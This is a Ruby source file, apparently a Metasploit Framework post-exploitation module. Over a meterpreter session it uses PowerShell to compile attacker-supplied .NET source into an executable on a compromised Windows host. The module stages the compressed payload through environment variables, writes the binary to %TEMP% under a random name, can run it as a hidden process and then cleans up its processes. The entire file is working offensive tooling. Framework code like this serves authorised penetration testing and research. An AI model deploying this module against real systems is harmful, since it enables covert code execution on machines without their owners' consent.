
##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'msf/core/post/windows/powershell'
require 'msf/core/post/windows/powershell/dot_net'

class Metasploit3 < Msf::Post
	Rank = ExcellentRanking

	include Msf::Post::Windows::Powershell
	include Msf::Post::Windows::Powershell::DotNet

	def initialize(info={})
		super(update_info(info,
			'Name'                 => "Powershell .NET Compiler",
			'Description'          => %q{
				This module will build a .NET source file using powershell. The compiler builds
				the executable or library in memory and produces a binary. After compilation the 
				PoweShell session can also sign the executable if provided a path the a .pfx formatted
				certificate. Compiler options and a list of assemblies required can be configured 
				in the datastore.
			},
			'License'              => MSF_LICENSE,
			'Version'              => '$Revision$',
			'Author'               => 'RageLtMan <rageltman[at]sempervictus>',
			'Platform'      => [ 'windows' ],
			'SessionTypes'  => [ 'meterpreter' ],
			'Targets' => [ [ 'Universal', {} ] ],
			'DefaultTarget' => 0,

		))

		register_options(
			[
				OptPath.new('SOURCE_FILE', [true, 'Path to source code']),
				OptBool.new('RUN_BINARY', [false, 'Execute the genrated binary', false]),
				OptString.new('ASSEMBLIES', [
					false, 
					'Any assemblies outside the defaults',
					"mscorlib.dll, System.dll, System.Xml.dll, System.Data.dll, System.Net.dll"
				]),
				OptString.new('OUTPUT_TARGET', [true, 'Name and path of the generated binary, default random, omit extension' ]),
				OptString.new('COMPILER_OPTS', [false, 'Options to pass to compiler', '/optimize']),
				OptString.new('CODE_PROVIDER', [true, 'Code provider to use', 'Microsoft.CSharp.CSharpCodeProvider']),

			], self.class)
		register_advanced_options(
			[
				OptString.new('NET_CLR_VER', [false, 'Minimun NET CLR version required to compile', '3.5']),
			], self.class)

	end

	def exploit

		# Make sure we meet the requirements before running the script
		if !(session.type == "meterpreter" || have_powershell?)
			print_error("Incompatible Environment")
			return 0
		end
		# Havent figured this one out yet, but we need a PID owned by a user, cant steal tokens either
		if client.sys.config.getuid == 'NT AUTHORITY\SYSTEM'
			print_error("Cannot run as system")
			return 0
		end
		


		# End of file marker
		eof = Rex::Text.rand_text_alpha(8)
		env_suffix = Rex::Text.rand_text_alpha(8)
		net_com_opts = {}
		net_com_opts[:target] = datastore['OUTPUT_TARGET'] || session.fs.file.expand_path('%TEMP%') + "\\#{ Rex::Text.rand_text_alpha(rand(8)+8) }.exe"
		net_com_opts[:com_opts] = datastore['COMPILER_OPTS']
		net_com_opts[:provider] = datastore['CODE_PROVIDER']
		net_com_opts[:assemblies] = datastore['ASSEMBLIES']
		net_com_opts[:net_clr] = datastore['NET_CLR_VER']
		net_com_opts[:cert] = datastore['CERT_PATH']

		begin
			script = ::File.read(datastore['SOURCE_FILE'])
		rescue => e
			print_error(e)
			return
		end

		vprint_good("Writing to #{net_com_opts[:target]}")

		# Compress
		print_status('Compressing script contents:')
		compressed_script = compress_script(script, eof)

		# If the compressed size is > 8100 bytes, launch stager
		if (compressed_script.size > 8100)
			print_error(" - Compressed size: #{compressed_script.size}")
			error_msg =  "Compressed size may cause command to exceed "
			error_msg += "cmd.exe's 8kB character limit."
			print_error(error_msg)
			print_status('Launching stager:')
			script = stage_to_env(compressed_script, env_suffix)
			print_good("Payload successfully staged.")
		else
			print_good(" - Compressed size: #{compressed_script.size}")
			script = compressed_script
		end

		# Execute the powershell script
		print_status('Executing the script.')
		cmd_out, running_pids, open_channels = execute_script(script, true)
		get_ps_output(cmd_out,eof)
		vprint_good( "Cleaning up #{running_pids.join(', ')}" )

		clean_up(nil, eof, running_pids, open_channels, env_suffix, false)
		
		# Check for result
		begin
			size = session.fs.file.stat(net_com_opts[:target].gsub('\\','\\\\')).size
			vprint_good("File #{net_com_opts[:target].gsub('\\','\\\\')} found, #{size}kb")
		rescue
			print_error("File #{net_com_opts[:target].gsub('\\','\\\\')} not found")
			return
		end

		# Run the result
		if datastore['RUN_BINARY']
			session.sys.process.execute(net_com_opts[:target].gsub('\\','\\\\'), nil, {'Hidden' => true, 'Channelized' => true})
		end


		print_good('Finished!')
	end


end
